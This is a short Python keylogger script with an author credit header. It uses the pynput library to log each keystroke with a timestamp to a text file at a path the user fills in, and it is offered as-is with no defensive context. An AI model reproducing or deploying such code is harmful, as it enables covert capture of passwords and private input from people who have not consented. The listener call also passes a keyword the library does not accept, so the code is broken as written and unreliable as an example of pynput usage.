# |--------------------------------------------------------------------|
# |    coded by Hazem Hisham                                           |
# |    FB account <<>> https://www.facebook.com/human.script.01 <<>>   |
# |    date 6/25/2018                                                  |
# |    github <<>> https://github.com/MRX-01 <<>>                      |
# |--------------------------------------------------------------------|

#This is library

from pynput.keyboard import Key, Listener
import logging

#|-------------------------------------------------------------------|
#|                             file log                              |
#|-------------------------------------------------------------------|
log_file = " path here " # here you should put your path same "C:\\Users\\your pc name \\Desktop\\keylogger\\"
logging.basicConfig(filename=((log_file) + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def keylogger_(key):
    logging.info(str(key))

#|-------------------------------------------------------------------|        
#|                          This is listener                         |
#|-------------------------------------------------------------------|    
with Listener(keylogger_=keylogger_) as listener:
    listener.join()
